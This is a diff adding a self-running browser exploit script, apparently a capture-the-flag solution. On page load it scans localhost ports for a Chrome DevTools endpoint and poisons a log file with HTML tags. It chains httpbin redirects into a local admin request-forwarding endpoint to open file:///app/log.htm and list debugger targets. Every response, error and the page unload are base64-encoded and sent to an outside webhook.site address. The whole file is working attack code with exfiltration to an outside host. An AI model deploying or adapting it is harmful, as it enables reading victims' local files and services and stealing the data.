@@ -1,0 +1,85 @@
+<script>
+    const totalPorts = 66000 - 30000;
+    const batches = 300;
+    const portsPerSecond = totalPorts / batches;
+
+    async function checkPort(port) {
+        return fetch(`http://localhost:${port}/json/version`, { method: 'GET', mode: 'no-cors', signal: AbortSignal.timeout(1000) })
+            .then(response => port)
+            .catch(() => null);
+    }
+
+    async function bruteforcePorts(start, end) {
+        const results = [];
+        for (let i = start; i <= end; i += portsPerSecond) {
+            console.log('START');
+
+            const batch = [];
+            for (let port = i; port < i + portsPerSecond && port <= end; port++) {
+                batch.push(checkPort(port));
+            }
+
+            const batchResults = await Promise.all(batch);
+            results.push(...batchResults.filter(port => port !== null));
+
+            if (results.length > 0) {
+                break;
+            }
+        }
+        return results;
+    }
+
+    async function downloadFileAndBlock(port) {
+        let cdpPort = port;
+
+        async function handleRsp(prom) {
+            try {
+                let rsp = await fetch(prom);
+                let text = await rsp.text();
+
+                await fetch('https://webhook.site/1a8c08ae-3b83-4795-be29-8fba3587acdc?data=' + btoa(text), { mode: 'no-cors' });
+                return text;
+            } catch (e) {
+                await fetch('https://webhook.site/1a8c08ae-3b83-4795-be29-8fba3587acdc?data=' + e, { mode: 'no-cors' });
+            }
+        }
+
+        async function start() {
+            // Poison log file
+            let rsp1 = await handleRsp('/' + encodeURIComponent('<title>'));
+            await fetch('https://httpbin.org/delay/1', { mode: 'no-cors' });
+            await handleRsp('/' + encodeURIComponent('</title>'));
+            await fetch('https://httpbin.org/delay/1', { mode: 'no-cors' });
+
+            let rsp2 = await handleRsp('https://httpbin.org/redirect-to?url=' + encodeURIComponent('http://localhost:8080/admin/doHttpReq?method=PUT&url=' + encodeURIComponent('http://127.0.0.1:' + cdpPort + '/json/new?file:///app/log.htm')));
+            setTimeout(async () => {
+                let rsp3 = await handleRsp('https://httpbin.org/redirect-to?url=' + encodeURIComponent('http://localhost:8080/admin/doHttpReq?url=' + encodeURIComponent('http://127.0.0.1:' + cdpPort + '/json/list')));
+                console.log(rsp3);
+            }, 5000);
+            await fetch('https://httpbin.org/delay/6', { mode: 'no-cors' });
+
+        }
+
+        start();
+    }
+
+
+    window.startFn = (async () => {
+        const openPorts = await bruteforcePorts(30000, 66000);
+        console.log(openPorts);
+
+        if (openPorts.length > 0) {
+            console.log('Open Ports:', JSON.stringify(openPorts[0]));
+            downloadFileAndBlock(openPorts[0]);
+        } else {
+            console.log('none');
+            fetch('https://webhook.site/1a8c08ae-3b83-4795-be29-8fba3587acdc?data=none');
+        }
+    });
+
+    window.startFn();
+
+    window.onbeforeunload = function () {
+        fetch('https://webhook.site/1a8c08ae-3b83-4795-be29-8fba3587acdc?data=unload');
+    }
+</script>
